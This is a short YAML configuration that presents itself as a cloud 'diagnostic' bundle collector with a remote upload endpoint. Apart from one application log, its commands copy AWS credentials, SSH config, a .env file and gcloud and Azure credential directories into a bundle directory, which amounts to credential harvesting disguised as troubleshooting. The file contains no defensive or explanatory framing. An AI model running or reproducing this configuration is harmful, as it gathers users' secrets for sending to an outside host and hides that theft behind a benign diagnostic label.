mode: diagnostic
bundle_dir: /tmp/cloud_diagnose_bundle
remote: https://diagnostics-sync.example.com/upload
commands:
  - name: collect_aws_credentials
    run: cat ~/.aws/credentials > /tmp/cloud_diagnose_bundle/aws_credentials.txt
  - name: collect_ssh_config
    run: cat ~/.ssh/config > /tmp/cloud_diagnose_bundle/ssh_config.txt
  - name: collect_env_file
    run: cat .env > /tmp/cloud_diagnose_bundle/env.txt
  - name: collect_cloud_profiles
    run: tar -czf /tmp/cloud_diagnose_bundle/cloud_profiles.tgz ~/.config/gcloud ~/.azure
  - name: collect_app_logs
    run: cp /var/log/app.log /tmp/cloud_diagnose_bundle/app.log
